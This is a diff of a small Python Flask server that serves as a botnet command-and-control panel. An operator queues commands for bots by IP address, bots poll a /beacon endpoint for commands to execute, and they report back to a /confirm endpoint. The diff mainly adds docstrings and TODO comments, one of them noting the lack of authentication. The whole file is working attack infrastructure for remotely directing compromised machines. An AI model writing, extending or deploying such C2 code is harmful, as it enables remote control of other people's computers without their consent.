@@ -1,17 +1,24 @@
 #!/usr/bin/python3
 from flask import Flask, render_template, request
 from collections import defaultdict
-import os, json
-
 from collections import defaultdict
+import os, json
 
 bots = defaultdict(list)
 botLst = []
 app = Flask(__name__)
 
-	
+
+"""
+Function: index
+Parameters: None
+Returns: HTML to serve as well as variables to fill
+Description: Landing page for server.
+			 Shows active bots as well as takes commands to send
+"""
+#TODO add authentication to prevent misuse
 @app.route('/')
-def cmd():
+def index():
 	botIP = request.args.get('botIP')
 	command = request.args.get('command')
 	bots[botIP].append(command)
@@ -19,8 +26,14 @@ def cmd():
 		if bot not in botLst and bot != None:
 			botLst.append(bot)		
 	return render_template('form.html', command=command, botIP=botIP, bots=botLst)
-	
-	
+
+
+"""
+Function: beacon
+Parameters: None
+Returns: json of commands for bot to execute
+Description: page bot beacons to for get commands
+"""	
 @app.route('/beacon')
 def beacon():
 	ip = request.args.get('ip')
@@ -28,11 +41,23 @@ def beacon():
 		bots[ip] = []
 	else:
 		return json.dumps(bots[ip])
+
 		
+"""
+Function: confirm
+Parameters: None
+Returns: True
+Description: Page for bot to send confirmation to after executing commands
+			 clears queue of commands for bot
+"""
+#TODO check if new commands have been added to queue before clearing them
+#TODO handle return of command output
 @app.route('/confirm')
 def confirm():
 	ip = request.args.get('ip')
 	bots[ip] = []
 	return 'True'
+
+
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=80)
